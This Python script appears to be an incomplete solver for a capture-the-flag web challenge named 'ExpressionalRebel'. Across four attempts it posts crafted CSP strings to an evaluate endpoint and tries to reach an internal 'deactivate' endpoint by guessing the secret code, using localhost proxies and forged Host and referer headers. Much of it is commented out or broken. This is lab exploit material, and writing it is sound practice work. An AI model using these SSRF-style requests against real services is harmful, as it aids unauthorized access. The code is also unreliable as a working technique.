#!/usr/bin/python3

"""
ExpressionalRebel:
    looks like, i've to send a specific 
    csp(control security policy) to get
    the secretCode and of course the FLAG

:author: Arturo Negreiros
    
"""

import re
from pwn import *
from pprint import pprint
import requests
import sys
from time import sleep

FlagEnvironment = str


def run_3xpl0it(url: str) -> FlagEnvironment:

    try:

        proxy = {
            "https": 'https://127.0.0.1:1337/deactivate?secretCode=H',
            "http": 'http://127.0.0.1:1337/deactivate?secretCode=H'
        }
        log.progress("initializing exploit")
        sess = requests.session()
        # response = sess.get(url=url)

        ress = sess.post(url=url+"api/evaluate", data={
            "csp": "img-src https: data:; object-src 'none'; default-src 'none'; script-src http://127.0.0.1:1337 http://127.0.0.1;"
        })
        log.info(f"status_code = {ress.status_code}")
        if ress.status_code == 200:
            pprint(ress.json())
        else:
            log.error('something went wrong')

        # print(sess.get(url=f"{url}deactivate", params={
        #     "secretCode":'HTB'
        # },proxies=proxy ,headers={
        #     "Host":"127.0.0.1:1337",
        #     "User-Agent":"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
        # }).text)

    except Exception as e:
        print("Error by: ", str(e))
        exit(1)
    except KeyboardInterrupt:
        exit(0)


def expressionalrebel_exploit(url):


    proxy = {
        "https": f'https://127.0.0.1:80',
        "http": f'http://127.0.0.1:80'
    }
    csp_exploit = {
            "csp": "default-src 'none' 'unsafe-inline';style-src 'unsafe-inline' ; object-src 'none'; report-uri https://127.0.0.0:1337/ 'unsafe-eval';"
    }

    log.info("sending payloads...")

    # updating the headers
    # first_ress.headers.update({"Host": "127.0.0.0"})
    # headers = first_ress.headers
    
    headers={
                "Access-Control-Request-Method": "GET",
                "Origin": "*",
                "Access-Control-Request-Headers": "Authorization",
    }


    requests.get(url=url, headers=headers)
    

    """params = {
        "secretCode":"H"
    }
    ress = requests.post(url=url+"api/evaluate",
                         json=csp_exploit)
    log.info(f"status code {ress.status_code}")
    if ress.status_code == 200:

        resp = requests.get(url=url+"deactivate", params=params, headers=headers, proxies=proxy)

        if "Denied access" in resp.text:
            print(resp.text)
            print("keep trying :( ")
            print(resp.url)
        else:
            print("you got it arhuron :) ")
        # if resp.status_code == 200:
        #     print("OK")
        # else:
        #     print(resp.status_code)
        #     # print(resp.text)
    """



def third_attempt(url):

    # headers = {
    #    "Host":"http://127.0.0.0:1337/"
    # }

    first_ress = requests.get(url=url)
    first_ress.headers.update({"Host":"http://127.0.0.1:1337/", "referer":"http://127.0.0.1:1337"})
    headers = first_ress.headers

    params = {
        "secretCode":"H"
    }
    response = requests.get(url="http://127.0.0.1:1337/index.html?url={url}deactivate?secretCode=H",
            headers=headers,
            params=params)
    
    print(response.text)




def fourth_attempt(url):
    
    params = {
        "secretCode":"HTB{"
    }
    ress = requests.get(url=url+"deactivate", params=params)
    print(ress.text)



def main():
    url = sys.argv[1]
    # run_3xpl0it(url)
    # expressionalrebel_exploit(url)
    # third_attempt(url)

    fourth_attempt(url)



if __name__ == "__main__":
    main()
